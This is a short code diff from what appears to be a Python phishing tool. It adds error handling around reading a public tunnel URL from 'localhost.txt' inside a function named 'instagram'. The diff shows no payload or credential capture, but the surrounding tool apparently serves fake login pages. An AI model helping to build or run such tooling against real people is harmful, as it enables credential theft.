@@ -257,12 +257,16 @@ def instagram():
         print("                          " , end="\r")
         
 #Generate Link====================================================================================================
-        line = linecache.getline(r"localhost.txt" , 5)
-        
-        line = line.split()
-        
-        print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
-        
+        try:
+            line = linecache.getline(r"localhost.txt" , 5)
+            
+            line = line.split()
+            
+            print(f"{Fore.CYAN}Your URL : {Fore.LIGHTWHITE_EX}{line[3]}" + Fore.RESET)
+        except IndexError:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} Cant Generate URL !""")
+            
         sleep(0.1)
         linecache.clearcache()
         
